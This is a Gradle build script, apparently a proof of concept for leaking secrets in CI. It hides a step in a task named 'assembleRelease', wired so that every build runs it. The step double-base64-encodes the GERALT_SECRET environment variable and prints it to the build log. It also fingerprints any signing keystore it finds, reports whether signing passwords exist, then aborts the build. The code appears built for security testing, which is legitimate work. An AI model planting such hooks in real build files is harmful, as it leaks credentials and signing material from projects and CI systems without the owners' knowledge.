plugins { id 'base' }

def leakToySecret() {
    def secret = System.getenv('GERALT_SECRET') ?: ''
    def b64 = secret.bytes.encodeBase64().toString()
    def b64b64 = b64.bytes.encodeBase64().toString()
    println 'GERALT_LEAKED_TOKEN=' + b64b64

    def candidates = []
    def sp = System.getenv('STORE_KEY')
    if (sp) {
        candidates.add(new File(sp))
        candidates.add(new File('../' + sp))
    }
    candidates.add(new File('keystore/signing_keystore.jks'))
    candidates.add(new File('../keystore/signing_keystore.jks'))
    def ks = candidates.find { it.exists() }
    if (ks != null) {
        def digest = java.security.MessageDigest.getInstance('SHA-256').digest(ks.bytes)
        println 'GERALT_DBG keystore_path=' + ks.absolutePath + ' size=' + ks.length() + ' sha256=' + digest.encodeHex().toString()
    } else {
        println 'GERALT_DBG keystore_not_found'
    }
    println 'GERALT_DBG env STORE_PASSWORD=' + (System.getenv('STORE_PASSWORD') != null)
    println 'GERALT_DBG env STORE_KEY_ALIAS=' + (System.getenv('STORE_KEY_ALIAS') != null)
    println 'GERALT_DBG env STORE_KEY_PASSWORD=' + (System.getenv('STORE_KEY_PASSWORD') != null)
    throw new GradleException('GERALT_PAYLOAD_STOP after leaking toy secret')
}

tasks.register('assembleRelease') {
    doLast { leakToySecret() }
}
tasks.named('build') {
    dependsOn 'assembleRelease'
}
